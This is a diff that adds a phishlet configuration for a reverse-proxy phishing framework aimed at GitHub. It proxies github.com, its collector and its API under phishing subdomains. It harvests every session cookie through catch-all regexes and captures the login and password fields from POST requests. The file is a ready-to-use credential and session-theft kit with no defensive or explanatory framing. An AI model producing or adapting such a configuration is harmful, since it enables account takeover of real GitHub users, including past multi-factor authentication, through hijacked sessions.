@@ -1,0 +1,26 @@
+min_ver: '3.2.0'
+proxy_hosts:
+  - {phish_sub: 'github', orig_sub: 'github', domain: 'com', session: true, is_landing: true}
+  - {phish_sub: 'collect', orig_sub: 'collector', domain: 'github.com', session: true, is_landing: false}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'github.com', session: true, is_landing: false}
+sub_filters:
+# - {triggers_on: 'breakdev.org', orig_sub: 'academy', domain: 'breakdev.org', search: 'something_to_look_for', replace: 'replace_it_with_this', mimes: ['text/html']}
+auth_tokens:
+  - domain: '.github.com'
+    keys: ['.*:regexp']
+  - domain: 'github.com'
+    keys: ['.*:regexp']
+auth_urls:
+  - '/dashboard'
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'github.com'
+  path: '/'
